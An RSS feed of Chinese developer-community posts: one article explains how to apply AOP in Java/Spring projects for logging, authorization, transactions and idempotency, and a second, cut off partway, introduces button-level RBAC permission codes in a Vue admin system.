<?xml version="1.0" encoding="UTF-8"?><rss version="2.0">  <channel>      <title>掘金文章推荐</title>      <link>https://juejin.cn/recommended?sort=newest</link>      <description>一个帮助开发者成长的社区</description>      <generator>python juejin_recom.py @Pi20</generator>      <item>    <title><![CDATA[快手二面：如何在项目中应用AOP？]]></title>    <link>https://juejin.cn/post/7602158221852131343</link>    <guid>https://juejin.cn/post/7602158221852131343</guid>    <pubDate>2026-02-03T06:17:57.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602158221852131343" data-draft-id="7598947628450218011" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="快手二面：如何在项目中应用AOP？"/> <meta itemprop="keywords" content="后端,面试,Java"/> <meta itemprop="datePublished" content="2026-02-03T06:17:57.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="程序员飞鱼"/> <meta itemprop="url" content="https://juejin.cn/user/1665088861772688"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            快手二面：如何在项目中应用AOP？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1665088861772688/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    程序员飞鱼
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T06:17:57.000Z" title="Tue Feb 03 2026 06:17:57 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{line-height:1.75;font-family:-apple-system-font,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei UI,Microsoft YaHei,Arial,sans-serif;letter-spacing:2px;background-image:linear-gradient(90deg,rgba(50,0,0,.05) 3%,transparent 0),linear-gradient(1turn,rgba(50,0,0,.05) 3%,transparent 0);background-size:20px 20px;background-position:50%;word-break:break-word;font-weight:400;font-size:15px;overflow-x:hidden;color:#333}.markdown-body h1{font-size:23px;margin-bottom:5px;font-weight:700;padding-left:10px;border-left:5px solid #773098}.markdown-body h2{font-size:19px;font-weight:700;padding-left:10px;border-left:5px solid #916dd5}.markdown-body h3{font-size:17px;font-weight:700;padding-left:10px;border-left:5px solid #d89cf6}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{font-size:14px;margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{display:block;max-width:100%;margin:1em 0;border-radius:6px;box-shadow:2px 4px 7px #999;user-select:none}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{padding:.2em .5em;font-weight:700;font-family:-apple-system-font,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei UI,Microsoft YaHei,Arial,sans-serif;font-size:1em;color:#916dd5;word-break:break-word;overflow-x:auto;background-color:none;border-radius:2px}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;font-family:-apple-system-font,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei UI,Microsoft YaHei,Arial,sans-serif;font-weight:400;font-size:.9em;padding:16px 12px;margin:0;color:#333;word-break:normal;overflow-x:auto;background:#f8f8f8;scroll-behavior:smooth}.markdown-body a{text-decoration:none;color:#916dd5;font-weight:700;border-bottom:1px solid #916dd5}.markdown-body a:active,.markdown-body a:hover{color:#773098}.markdown-body table{display:inline-block!important;font-size:14px;width:auto;max-width:100%;overflow:auto;border:1px solid #916dd5;border-collapse:collapse}.markdown-body thead{background-color:#916dd5;color:#fff;text-align:left}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px;border:1px solid #916dd5}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #d89cf6;background-color:#f4eeff}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0;line-height:26px}.markdown-body ol,.markdown-body ul{padding-left:28px;list-style-type:circle}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body b,.markdown-body strong{color:#916dd5;font-weight:700}.markdown-body b:before,.markdown-body strong:before{content:"「"}.markdown-body b:after,.markdown-body strong:after{content:"」"}.markdown-body em,.markdown-body i{color:#916dd5}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="github-gist">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#fff;color:#333}.hljs-comment,.hljs-meta{color:#969896}.hljs-emphasis,.hljs-quote,.hljs-strong,.hljs-template-variable,.hljs-variable{color:#df5000}.hljs-keyword,.hljs-selector-tag,.hljs-type{color:#d73a49}.hljs-attribute,.hljs-bullet,.hljs-literal,.hljs-symbol{color:#0086b3}.hljs-name,.hljs-section{color:#63a35c}.hljs-tag{color:#333}.hljs-attr,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-id,.hljs-selector-pseudo,.hljs-title{color:#6f42c1}.hljs-addition{color:#55a532;background-color:#eaffea}.hljs-deletion{color:#bd2c00;background-color:#ffecec}.hljs-link{text-decoration:underline}.hljs-number{color:#005cc5}.hljs-string{color:#032f62}</style><p><strong>文章内容收录到个人网站，方便阅读</strong>：<a href="https://link.juejin.cn?target=http%3A%2F%2Fhardyfish.top%2F" target="_blank" title="http://hardyfish.top/" ref="nofollow noopener noreferrer">hardyfish.top/</a></p>
<p>AOP（Aspect-Oriented Programming，面向切面编程）解决的是一类“横切关注点”问题。</p>
<p>这些逻辑不属于任何一个核心业务用例，却几乎散落在所有用例周围，例如日志、权限、事务、监控、幂等等。</p>
<p>把它们从业务代码里抽离出来，集中声明、统一织入（weaving），业务代码就能保持干净、稳定，治理策略也更可控。</p>
<p><strong>AOP 的典型应用场景（按工程收益排序）</strong></p>
<p>1）统一日志与审计（Audit）</p>
<ul>
<li><strong>访问日志</strong>：记录接口入参、出参、耗时、调用方标识、traceId（链路标识）。</li>
<li><strong>审计日志</strong>：记录“谁在什么时间对什么资源做了什么操作”，通常要求不可抵赖、可追溯。</li>
<li>价值：避免在每个 Service/Controller 里手写 <code>log.info()</code>；字段口径一致，便于检索与风控。</li>
</ul>
<p>典型切点：</p>
<ul>
<li>Controller 层：记录 HTTP 请求维度信息（URI、method、IP、UA）。</li>
<li>Service 层：记录业务动作（下单、退款、审批）与关键业务 ID。</li>
</ul>
<p>2）鉴权、登录态与数据权限</p>
<ul>
<li><strong>接口鉴权</strong>：基于角色/权限点/资源范围的拦截。</li>
<li><strong>数据权限</strong>：例如同一接口返回数据需按部门、租户、组织树过滤。</li>
<li>价值：避免权限判断散落在各处导致遗漏；策略可集中升级（例如从 RBAC 升级到 ABAC）。</li>
</ul>
<p>注意边界：</p>
<ul>
<li>粗粒度鉴权常在网关或过滤器做；细粒度（到方法/资源）更适合 AOP。</li>
</ul>
<p>3）事务管理与一致性边界</p>
<ul>
<li>典型：Spring <code>@Transactional</code> 本质就是 AOP 代理在方法边界开启/提交/回滚事务。</li>
<li>价值：将数据库事务与业务方法边界绑定，避免手写 begin/commit/rollback。</li>
</ul>
<p>常见陷阱（影响实际效果）：</p>
<ul>
<li>同类内部方法调用（self-invocation）绕过代理导致事务不生效。</li>
<li>异步/新线程内执行不继承事务上下文。</li>
<li>仅对 <code>public</code> 方法生效（常见默认代理策略下）。</li>
</ul>
<p>4）性能监控与链路追踪（Metrics/Tracing）</p>
<ul>
<li><strong>耗时埋点</strong>：方法级耗时、异常率、慢调用统计。</li>
<li><strong>Tracing</strong>：在入口生成或透传 traceId/spanId，打通日志、指标与调用链。</li>
<li>价值：性能治理落到方法粒度；定位“慢在哪里”比“慢了”更重要。</li>
</ul>
<p>5）异常治理与统一错误码</p>
<ul>
<li><strong>异常转换</strong>：将底层异常（SQL、RPC、网络）统一转换为领域错误码与可读信息。</li>
<li><strong>降噪</strong>：对可预期异常降级日志级别，对未知异常保留堆栈与告警。</li>
<li>价值：错误口径统一，前端/调用方契约稳定。</li>
</ul>
<p>说明：Web 层的统一异常处理常由 <code>@ControllerAdvice</code> 完成；AOP 更适合 Service/RPC 方法边界的异常策略。</p>
<p>6）幂等、限流、熔断与重试（Resilience）</p>
<ul>
<li><strong>幂等</strong>：重复请求只生效一次（支付回调、消息消费、创建类接口）。</li>
<li><strong>限流/熔断/重试</strong>：围绕外部依赖（RPC、第三方 API）的稳定性策略。</li>
<li>价值：与业务解耦，策略可配置、可迭代。</li>
</ul>
<p>实现方式：</p>
<ul>
<li>AOP + Redis（幂等 key、分布式锁、令牌桶计数）。</li>
<li>AOP + Resilience4j/Sentinel（限流熔断）更常见。</li>
</ul>
<p>7）参数校验与契约约束</p>
<ul>
<li>对方法入参做统一校验（非空、范围、格式、跨字段约束）。</li>
<li>价值：减少重复 <code>if</code> 判断；失败策略统一（错误码、提示语、日志级别）。</li>
</ul>
<p>补充：Java 常用 Bean Validation（JSR 380）在 Controller/Service 也可通过 AOP 触发与增强。</p>
<p>8）缓存（Cache Aside）与防穿透</p>
<ul>
<li>读取前先查缓存，失效再回源；写入后失效缓存。</li>
<li>价值：将缓存策略从业务代码剥离，避免“到处写缓存”导致一致性混乱。</li>
</ul>
<p>注意：缓存与业务一致性强相关，AOP 更适合“可容忍短暂不一致”的读多写少场景；强一致要更谨慎。</p>
<p><strong>在项目中应用 AOP 的落地方式（从设计到上线）</strong></p>
<p>1）先定“切面边界”：在哪一层织入</p>
<p>常用选择：</p>
<ul>
<li><strong>Controller 边界</strong>：更贴近请求语义，适合访问日志、traceId、统一入参脱敏、灰度标记读取。</li>
<li><strong>Service 边界</strong>：更贴近业务动作，适合事务、权限点校验、幂等、审计、指标。</li>
<li><strong>Client/RPC 边界</strong>：更贴近外部依赖，适合重试、熔断、超时、降级、调用统计。</li>
</ul>
<p>边界选择原则：</p>
<ul>
<li>和“责任归属”对齐：谁拥有这个策略的变更权。</li>
<li>和“失败后果”对齐：例如幂等应尽量靠近写入点（Service/Repo）。</li>
</ul>
<p>2）用注解表达意图，用 Pointcut 表达范围</p>
<p>落地基本套路是“自定义注解 + 切点表达式”：</p>
<ul>
<li>注解表达<strong>业务意图</strong>：<code>@Audit</code>、<code>@Idempotent</code>、<code>@RateLimit</code>。</li>
<li>Pointcut 表达<strong>作用范围</strong>：包路径、类/方法、注解、参数类型。</li>
</ul>
<p>示例（概念级）：</p>
<ul>
<li><code>@Pointcut("@annotation(com.xxx.Audit)")</code></li>
<li><code>@Around("execution(* com.xxx..service..*(..)) &amp;&amp; @annotation(audit)")</code></li>
</ul>
<p>这样做的好处是范围可控，避免“一刀切”拦截导致性能与副作用问题。</p>
<p>3）选对 Advice 类型：Around/Before/AfterThrowing</p>
<ul>
<li><strong>@Around</strong>：最常用，可拿到入参、执行目标方法、拿到返回值、捕获异常、统计耗时。</li>
<li><strong>@Before</strong>：做前置校验、上下文准备（traceId、租户信息）。</li>
<li><strong>@AfterReturning</strong>：对返回结果做审计、埋点补充。</li>
<li><strong>@AfterThrowing</strong>：对异常做分类处理、告警、错误码映射。</li>
</ul>
<p>工程上常见组合：</p>
<ul>
<li>监控与耗时：<code>@Around</code></li>
<li>权限：<code>@Before</code> 或 <code>@Around</code></li>
<li>异常治理：<code>@AfterThrowing</code> 或 <code>@Around</code></li>
</ul>
<p>4）把“横切逻辑”做成可配置组件，而不是硬编码</p>
<p>可配置点通常包括：</p>
<ul>
<li>日志采样率、脱敏字段列表、最大入参长度</li>
<li>幂等 key 的生成策略（用户维度、业务单号维度、请求体 hash）</li>
<li>限流阈值、时间窗口、白名单</li>
<li>重试次数、退避策略（指数退避）、只重试的异常类型集合</li>
</ul>
<p>配置来源：</p>
<ul>
<li>Spring <code>@ConfigurationProperties</code></li>
<li>配置中心（Nacos/Apollo 等）</li>
<li>运行时动态开关（灰度）</li>
</ul>
<p>5）处理好顺序与嵌套：@Order 与事务/重试/幂等的关系</p>
<p>多个切面叠加时，“谁包住谁”会改变语义：</p>
<ul>
<li>幂等通常要在最外层：先拦重复请求，再执行业务。</li>
<li>事务要包住写入：但不要被“重试”无脑包住，否则可能造成重复写。</li>
<li>重试更适合包住“外部依赖调用”，而不是整个业务方法。</li>
</ul>
<p>在 Spring 中常用：</p>
<ul>
<li><code>@Order</code> 或实现 <code>Ordered</code> 控制切面优先级（数值越小优先级越高）。</li>
</ul>
<p>6）避免 AOP 的常见坑（影响生产效果）</p>
<ul>
<li><strong>代理失效</strong>：同类内部调用绕过代理；解决方式包括拆分 Bean、通过代理调用、或使用 AspectJ 编织。</li>
<li><strong>切点过宽</strong>：拦截范围太大引起性能问题或误拦截（例如把 getter/setter 也拦了）。</li>
<li><strong>拿不到参数名</strong>：需要编译参数 <code>-parameters</code> 或借助调试信息；否则审计字段提取困难。</li>
<li><strong>线程上下文丢失</strong>：traceId、租户信息在异步场景需显式传递（TTL、MDC 复制等）。</li>
<li><strong>异常吞掉</strong>：切面捕获异常后未再抛出，导致上层误以为成功，必须严格规定异常传播策略。</li>
<li><strong>返回值包装污染</strong>：切面统一包装响应时要考虑接口契约与序列化兼容，通常放在 Web 层更稳。</li>
</ul>
<p>7）一套可复用的“项目级 AOP 套件”长什么样</p>
<p>常见的可落地组合：</p>
<ul>
<li><code>AuditAspect</code>：注解驱动，抽取业务 ID、操作者、动作类型，写审计表或消息。</li>
<li><code>MetricAspect</code>：方法级耗时与异常率，打点到 Prometheus/Micrometer。</li>
<li><code>IdempotentAspect</code>：基于 Redis 的幂等 key + TTL + 并发互斥策略。</li>
<li><code>PermissionAspect</code>：权限点校验 + 数据范围注入（ThreadLocal 或参数增强）。</li>
<li><code>MaskingAspect</code>：日志脱敏，按字段规则处理（手机号、身份证、token）。</li>
</ul>
<p>配套约束：</p>
<ul>
<li>统一的上下文对象（如 <code>RequestContext</code>）承载 traceId、tenantId、operatorId。</li>
<li>统一的异常与错误码体系（枚举 + 领域异常）。</li>
<li>统一的日志字段规范（JSON log、固定 key）。</li>
</ul>
<p>适用边界：什么时候不该用 AOP</p>
<ul>
<li>逻辑与业务强绑定且需要显式可见（例如核心定价、风控决策），隐藏在切面里会降低可读性与审计性。</li>
<li>需要改写控制流且非常复杂（跨多步状态机），AOP 可能让调用路径难以追踪。</li>
<li>极致性能路径（纳秒级/微秒级要求）下，代理与反射开销需要评估，必要时用编译期织入或显式调用。</li>
</ul>
<p><strong>一个落地小案例（文字版）</strong></p>
<p>在“创建订单”场景里常见组合是：</p>
<ul>
<li>
<p>Controller：生成 traceId、记录访问日志、入参脱敏。</p>
</li>
<li>
<p>Service <code>createOrder()</code>：<code>@Idempotent</code> 保证重复提交不重复下单；<code>@Transactional</code> 保证订单与库存扣减原子；</p>
<ul>
<li><code>@Audit</code> 记录“用户创建订单”的审计事件；<code>MetricAspect</code> 记录耗时与异常。</li>
</ul>
</li>
<li>
<p>外部支付调用：在支付 Client 方法上织入 <code>Retry/CircuitBreaker</code>，并记录第三方调用耗时与错误码。</p>
</li>
</ul>
<p>这样业务代码只保留“下单这件事”的关键路径，治理策略集中在切面里，变更也集中发生。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[RBAC 权限系统实战（三）：细粒度的权限控制]]></title>    <link>https://juejin.cn/post/7602146335216664616</link>    <guid>https://juejin.cn/post/7602146335216664616</guid>    <pubDate>2026-02-03T06:17:45.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602146335216664616" data-draft-id="7602161364892925952" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="RBAC 权限系统实战（三）：细粒度的权限控制"/> <meta itemprop="keywords" content="前端,Vue.js"/> <meta itemprop="datePublished" content="2026-02-03T06:17:45.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="十五丶"/> <meta itemprop="url" content="https://juejin.cn/user/343495027727229"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            RBAC 权限系统实战（三）：细粒度的权限控制
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/343495027727229/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    十五丶
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T06:17:45.000Z" title="Tue Feb 03 2026 06:17:45 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前言</h2>
<p>本文主要讲解 RBAC 后台系统中的按钮级权限控制</p>
<blockquote>
<p>本文是<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fbryqiu%2FBlog%3Ftab%3Dreadme-ov-file%23%25E9%2580%259A%25E4%25BF%2597%25E6%2598%2593%25E6%2587%2582%25E7%259A%2584%25E4%25B8%25AD%25E5%2590%258E%25E5%258F%25B0%25E7%25B3%25BB%25E7%25BB%259F%25E5%25BB%25BA%25E8%25AE%25BE%25E6%258C%2587%25E5%258D%2597%25E4%25B8%2593%25E6%25A0%258F" target="_blank" title="https://github.com/bryqiu/Blog?tab=readme-ov-file#%E9%80%9A%E4%BF%97%E6%98%93%E6%87%82%E7%9A%84%E4%B8%AD%E5%90%8E%E5%8F%B0%E7%B3%BB%E7%BB%9F%E5%BB%BA%E8%AE%BE%E6%8C%87%E5%8D%97%E4%B8%93%E6%A0%8F" ref="nofollow noopener noreferrer">《通俗易懂的中后台系统建设指南》</a>系列的第十一篇文章，该系列旨在告诉你如何构建一个优秀的中后台管理系统。</p>
</blockquote>
<h2 data-id="heading-1">RBAC 权限细粒度</h2>
<p>在前两篇文章：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fbryqiu%2FBlog%2Fissues%2F17" target="_blank" title="https://github.com/bryqiu/Blog/issues/17" ref="nofollow noopener noreferrer">RBAC 权限系统实战（一）：页面级访问控制全解析</a>、<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fbryqiu%2FBlog%2Fissues%2F18" target="_blank" title="https://github.com/bryqiu/Blog/issues/18" ref="nofollow noopener noreferrer">RBAC 权限系统实战（二）：权限信息管理的设计</a> 中，我们在后台系统里已经实现了权限控制，但从权限细粒度的角度看，我们只做了“页面级”权限</p>
<p>在权限细粒度中，一般有这三种权限粒度：</p>
<ol>
<li><strong>页面/菜单级</strong>：用户是否能看到并访问该页面</li>
<li><strong>功能/操作级</strong>：进入页面后，是否能执行某个动作（比如按钮权限）</li>
<li><strong>数据级</strong>：可以操作、获取哪些数据、接口</li>
</ol>
<p>在某些业务场景下，我们希望用户能看到/进入页面，但不一定能操作所有功能。比如同一个列表页：A 只能“查看”，B 可以“新增/编辑”，C 还能“删除/导出”</p>
<p>因此本文主要实现操作级权限控制，也常称为“按钮级权限控制”</p>
<h2 data-id="heading-2">权限码设计</h2>
<p>在<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fbryqiu%2FBlog%2Fissues%2F17" target="_blank" title="https://github.com/bryqiu/Blog/issues/17" ref="nofollow noopener noreferrer">第一篇权限文章</a>中，我们在登录后，会请求用户信息接口，拿到用户的菜单路由数据再渲染访问</p>
<p>现在，还是基于这个接口返回的用户信息，我们要增加一个字段：<code>permissionCodes</code>，它是一个字符串数组，代表该用户拥有的操作权限</p>
<blockquote>
<p>我这里使用的是 ApiFox 来模拟的接口和数据，ApiFox 文档可以访问：<a href="https://link.juejin.cn?target=clean-admin.apifox.cn" target="_blank" title="clean-admin.apifox.cn" ref="nofollow noopener noreferrer">vue-clean-admin ApiFox 文档</a>，内有关于”获取用户信息接口“的文档介绍</p>
</blockquote>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7c15e3df1e7f4fe48bf55fd74779c052~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y2B5LqU5Li2:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770704265&amp;x-signature=m3UDYF2WWLb0vZA7ipyw5LPfyxg%3D" alt="image.png" loading="lazy"/></p>
<p>你可以看到，返回的权限码列表遵循一定的格式来确保语义清晰，我们约定，权限码的格式如下：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/455f334154c24d069e0a846a96019ff1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y2B5LqU5Li2:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770704265&amp;x-signature=daW0Af05VG%2BKYoycivESYBQ5haI%3D" alt="image.png" loading="lazy"/></p>
<p>比如下面的菜单模块，关于新增、详情的权限码：</p>
